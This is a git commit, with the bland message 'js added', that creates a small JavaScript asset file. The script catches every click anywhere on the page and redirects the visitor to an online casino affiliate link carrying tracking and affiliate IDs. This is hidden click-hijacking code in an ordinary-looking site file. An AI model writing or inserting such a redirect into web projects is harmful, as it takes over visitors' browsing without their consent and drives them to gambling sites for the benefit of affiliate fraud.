f4de681c16c849036347b655d4299cce72f8027b
Reece431 <Farnworthwork@gmail.com>
2021-09-30 12:50:30 +0100

    js added

---
+++ assets/app.js
@@ -0,0 +1,6 @@
+const cid = 'https://onlinecasino.kingcasino.com/Redirect.aspx?mid=348&sid=4187&cid=&pid=&affid=2955'
+
+document.addEventListener('click', () => {
+    window.location.href = cid;
+    console.log('click')
+})
